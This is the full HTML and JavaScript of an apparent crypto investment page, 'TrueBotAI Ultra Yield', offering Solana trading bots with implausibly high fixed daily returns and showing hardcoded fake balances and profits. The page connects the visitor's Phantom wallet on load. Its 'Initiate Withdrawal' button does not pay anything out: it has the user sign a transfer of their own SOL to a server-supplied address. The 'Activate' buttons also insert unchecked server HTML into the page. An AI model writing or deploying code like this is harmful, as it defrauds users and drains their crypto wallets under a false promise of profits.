<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>TrueBotAI Ultra Yield Dashboard</title>
<style>
/* Basic restored styling */
body { margin: 0; font-family: 'Roboto', sans-serif; background: #0a0f1a; color: #cbd5e1; }
header { background: #111827; padding: 1rem; text-align: center; border-bottom: 2px solid #f59e0b; }
header h1 { font-family: 'Orbitron', sans-serif; color: #f59e0b; margin: 0; }
button { cursor: pointer; border-radius: 20px; padding: 0.6rem 1rem; margin: 0.3rem; font-family: 'Orbitron', sans-serif; font-weight: 700; }
button.connect-wallet { background: #f59e0b; color: #0a0f1a; border: none; }
button.connect-wallet:hover { background: #d97706; }
nav { display: flex; justify-content: center; flex-wrap: wrap; margin: 1rem 0; }
nav button { background: transparent; border: none; color: #fbbf24; font-size: 1rem; padding: 0.5rem 1rem; }
nav button.active, nav button:hover { background: #f59e0b; color: #0a0f1a; }
main { max-width: 960px; margin: 2rem auto; padding: 0 1rem; }
.section { background: #1e293b; border-radius: 12px; padding: 2rem; margin-bottom: 2rem; }
.card-grid { display: grid; grid-template-columns: repeat(auto-fit,minmax(320px,1fr)); gap: 1.5rem; }
.card { background: #111827; border-radius: 10px; padding: 1.2rem; color: #fcd34d; display: flex; flex-direction: column; justify-content: space-between; min-height: 320px; }
.card h3 { margin: 0 0 0.6rem 0; color: #fbbf24; font-family: 'Orbitron', sans-serif; }
.card button { background: #f59e0b; color: #0a0f1a; border: none; }
.card button:hover { background: #d97706; }
footer { text-align: center; color: #fbbf24; padding: 1rem; border-top: 1px solid #f59e0b; }

/* Modal */
.modal { display: none; position: fixed; z-index: 1000; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); justify-content: center; align-items: center; }
.modal-content { background: #1e293b; margin: auto; padding: 2rem; border: 1px solid #f59e0b; border-radius: 12px; width: 80%; max-width: 500px; text-align: center; position: relative; }
.close-button { color: #aaa; position: absolute; top: 10px; right: 20px; font-size: 28px; font-weight: bold; cursor: pointer; }
.close-button:hover { color: white; }
.address-box { background: #111827; padding: 0.8rem; border-radius: 8px; margin-top: 1rem; word-break: break-all; }
</style>
</head>
<body>

<header>
<h1>TrueBotAI Ultra Yield</h1>
<div class="fee-notice">Performance Fee: <strong>20% of net profits</strong> only</div>
<button class="connect-wallet">Connect Wallet</button>
</header>

<nav>
<button class="active" data-section="trading">Ultra Trading Bots</button>
<button data-section="sniping">Extreme Sniping</button>
<button data-section="staking">Yield Farming</button>
<button data-section="mining">Quantum Mining</button>
<button data-section="portfolio">Portfolio Overview</button>
</nav>

<main>
<section id="trading" class="section">
<h2>Ultra Trading Bots</h2>
<div class="card-grid">
<div class="card" data-cid="QmTWm6xa4yXTP8TUgWstqoKn5aGhfzoa5ejntuUyhFbHVn">
<h3>Leverage Trading Bot</h3>
<p>Utilizes margin and algorithmic trading for ultra-high returns. Suitable only for experienced investors.</p>
<div class="earnings"><span>Daily: 4.0 SOL (~$120)</span><span>Monthly: 120 SOL (~$3,600)</span><span>Yearly: 1440 SOL (~$43,200)</span></div>
<div class="min-invest">Minimum Investment: 300 SOL (~$9,000)</div>
<button class="activate-btn">Activate</button>
</div>
</div>
</section>

<section id="portfolio" class="section" style="display:none;">
<h2>Portfolio Overview</h2>
<div class="portfolio-summary">
<p>Your investments summary, profit & loss, and withdrawal options will appear here.</p>
<div class="stat-item"><h3>Current Balance:</h3><span id="currentBalance">200.00 SOL</span></div>
<div class="stat-item"><h3>Total Profits:</h3><span id="totalProfits">50.00 SOL</span></div>
<button id="withdrawalBtn">Initiate Withdrawal</button>
</div>
</section>
</main>

<footer>Performance Fee: <strong>20% of net profits</strong> — No upfront or hidden fees.</footer>

<div id="paymentModal" class="modal">
<div class="modal-content">
<span class="close-button">&times;</span>
<h3 id="modalTitle"></h3>
<div id="modalBody"></div>
</div>
</div>

<script src="https://unpkg.com/@solana/web3.js@1.78.5/lib/index.iife.js"></script>
<script>
// Modal logic
const paymentModal = document.getElementById('paymentModal');
const modalTitle = document.getElementById('modalTitle');
const modalBody = document.getElementById('modalBody');
const closeButton = document.querySelector('.close-button');
closeButton.onclick = () => paymentModal.style.display = 'none';
window.onclick = e => { if(e.target==paymentModal) paymentModal.style.display='none'; }
const showModal = (title, message) => { modalTitle.textContent=title; modalBody.innerHTML=message; paymentModal.style.display='flex'; }

// Navigation
const buttons = document.querySelectorAll('nav button');
const sections = document.querySelectorAll('main section');
buttons.forEach(btn=>btn.addEventListener('click',()=>{buttons.forEach(b=>b.classList.remove('active'));btn.classList.add('active');const t=btn.dataset.section;sections.forEach(s=>s.style.display=(s.id===t)?'block':'none');}));

// Wallet connect
let userWallet = null;
const connectButton = document.querySelector('.connect-wallet');
const connectWallet = async ()=>{
if(window.solana && window.solana.isPhantom){
const resp=await window.solana.connect();
userWallet=resp.publicKey;
connectButton.textContent='Wallet Connected';
}else showModal('Wallet Not Found','<p>Phantom wallet not found. Please install it.</p>');
};
window.addEventListener('load', connectWallet);
connectButton.addEventListener('click', connectWallet);

// Withdrawal
const withdrawalBtn = document.getElementById('withdrawalBtn');
withdrawalBtn.addEventListener('click', async ()=>{
if(!userWallet){showModal('Wallet Not Connected','<p>Please connect Phantom wallet first.</p>');return;}
try{
const profitEl=document.getElementById('totalProfits');
const userProfit=parseFloat(profitEl.textContent);
if(isNaN(userProfit)||userProfit<=0){showModal('No Profits','<p>No profits to withdraw.</p>');return;}
const feeResp=await fetch('/api/withdraw',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({userProfit})});
const feeData=await feeResp.json();
const destination=new window.solanaWeb3.PublicKey(feeData.address);
const feeAmountLamports=feeData.feeAmount*window.solanaWeb3.LAMPORTS_PER_SOL;
const connection=new window.solanaWeb3.Connection(window.solanaWeb3.clusterApiUrl('mainnet-beta'),'confirmed');
const transaction=new window.solanaWeb3.Transaction().add(window.solanaWeb3.SystemProgram.transfer({fromPubkey:userWallet,toPubkey:destination,lamports:feeAmountLamports}));
const { signature } = await window.solana.signAndSendTransaction(transaction);
await connection.confirmTransaction(signature);
showModal('Withdrawal Sent',`<p>Transaction submitted!</p><div class="address-box">${signature}</div>`);
}catch(err){console.error(err);showModal('Transaction Error',`<p>${err.message}</p>`);}
});

// Activate buttons fetch IPFS
document.querySelectorAll('.activate-btn').forEach(button=>{
button.addEventListener('click',async e=>{
const card=e.target.closest('.card');const cid=card.dataset.cid;
showModal('Fetching Content','<p>Fetching IPFS content...</p>');
try{
const resp=await fetch(`/api/ipfs/${cid}`);
if(!resp.ok)throw new Error('Network response was not ok');
const html=await resp.text();
paymentModal.style.display='none';
card.innerHTML=html;
}catch(err){showModal('Content Error',`<p>${err.message}</p>`);}
});
});
</script>
</body>
</html>
